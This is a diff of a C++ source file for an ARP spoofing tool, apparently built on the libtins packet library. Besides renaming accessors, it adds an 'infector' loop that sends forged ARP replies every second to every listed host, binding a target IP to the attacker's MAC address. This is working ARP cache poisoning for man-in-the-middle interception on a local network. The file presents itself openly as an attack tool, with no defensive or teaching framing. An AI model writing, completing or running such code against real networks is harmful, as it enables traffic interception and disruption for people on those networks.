@@ -1,48 +1,50 @@
 #include "spoofer.h"
 #include <iostream>
-IPv4Address Spoofer::getSender() const
+#include <unistd.h>
+
+HWAddress<6> Spoofer::getLocal_mac() const
 {
-    return victim;
+    return local_mac;
 }
 
-void Spoofer::setVictim(const char *value)
+void Spoofer::setLocal_mac(const HWAddress<6> &value)
 {
-    victim = value;
+    local_mac = value;
 }
 
-IPv4Address Spoofer::getTarget() const
+IPv4Address Spoofer::getTarget_ip() const
 {
-    return target;
+    return target_ip;
 }
 
-void Spoofer::setTarget(const char *value)
+void Spoofer::setTarget_ip(const IPv4Address &value)
 {
-    target = value;
-}
-
-EthernetII::address_type Spoofer::getSender_mac() const
-{
-    return sender_mac;
-}
-
-void Spoofer::setSender_mac(const EthernetII::address_type &value)
-{
-    sender_mac = value;
-}
-
-EthernetII::address_type Spoofer::getTarget_mac() const
-{
-    return target_mac;
-}
-
-void Spoofer::setTarget_mac(const EthernetII::address_type &value)
-{
-    target_mac = value;
+    target_ip = value;
 }
 
 Spoofer::Spoofer()
 {
+    iface=iface.default_interface();
+}
 
+void Spoofer::infector(std::map<IPv4Address, HWAddress<6>> addresses)
+{
+
+    EthernetII arp_infection;
+    ARP arp;
+    while(condition)
+    {
+        for(const auto elem : addresses)
+        {
+            //To avoid recursive infection
+            if(elem.first==target_ip)
+                continue;
+
+            arp_infection=arp.make_arp_reply(elem.first,target_ip,elem.second,local_mac);
+            sender.send(arp_infection,iface);
+        }
+        sleep(1);
+    }
 }
 
 IPv4Address Spoofer::getLocalIpAddr()
@@ -68,5 +70,10 @@ EthernetII::address_type Spoofer::getMacAddr(IPv4Address unknown)
         return NULL;
     }
 
+}
+
+void Spoofer::semaphore()
+{
+    condition=!condition;
 }
 
